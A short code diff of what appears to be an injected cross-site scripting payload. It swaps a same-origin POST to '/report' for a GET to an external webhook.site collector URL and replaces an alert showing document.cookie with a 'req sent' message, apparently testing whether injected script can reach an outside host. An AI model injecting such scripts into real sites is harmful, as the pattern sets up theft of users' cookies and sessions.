@@ -1,13 +1,7 @@
 alert("injected");
 
-fetch("/report", {
-  method: "POST",
-  body: new URLSearchParams({
-    'id': '1'
-  }),
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  }
+fetch("https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?", {
+  method: "GET",
 })
 .then(response => {
   if (!response.ok) {
@@ -22,4 +16,4 @@ fetch("/report", {
   console.error('Fetch Error:', error);
 });
 
-alert(document.cookie)
+alert("req sent");
